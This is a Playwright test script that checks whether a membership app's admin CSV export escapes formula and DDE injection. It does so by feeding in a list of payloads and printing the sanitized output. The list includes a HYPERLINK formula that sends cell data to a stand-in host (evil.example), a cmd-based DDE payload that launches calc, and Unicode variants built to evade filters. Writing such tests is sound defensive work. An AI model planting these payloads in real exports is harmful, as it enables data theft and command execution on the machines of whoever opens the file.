// Security lens v2 — CSV export (formula / DDE injection) unit probe of PPAPI.store.admin.exportMembersCsv.
// Run from devtools/:  node flows/sec-v2-csv.mjs
import { chromium } from 'playwright';
import { startServer } from './qa-lib.mjs';

const { BASE, close } = await startServer();
const browser = await chromium.launch();
const page = await browser.newPage();
await page.goto(`${BASE}/index.html`, { waitUntil: 'networkidle' });
const out = await page.evaluate(() => {
  const S = PPAPI.store;
  const vals = [
    '=HYPERLINK("https://evil.example/?x="&A1,"klik")', '+1+1', '-1+1', '@SUM(1+1)', '\t=1+1', '\r=1+1', '＝1+1',
    ' =1+1', '  +1+1', '\n=1+1', '"=1+1', "'=1+1", '=cmd|\' /C calc\'!A0', 'a;=1+1', '|calc', '%0A=1+1', '=1+1\n=2+2',
    ' =1+1', '​=1+1', '﻿=1+1', '　=1+1', '＠SUM(1)', '﹦1+1', '=1+1'.replace('=', ' =')
  ];
  return vals.map((v, i) => {
    const m = { uid: 'u' + i, name: v, email: 'a@b.id', phone: v, status: 'Draf', profile: { company: v, city: v, position: v }, application: { type: 'baru' } };
    const csv = S.admin.exportMembersCsv([m]);
    const row = csv.split('\r\n')[1];
    return { v: JSON.stringify(v), name: JSON.stringify(row.split(';')[1]), phone: JSON.stringify(row.split(';')[3]) };
  });
});
for (const r of out) console.log(r.v.padEnd(48), '→ name', r.name.padEnd(54), ' phone', r.phone);
await browser.close();
await close();
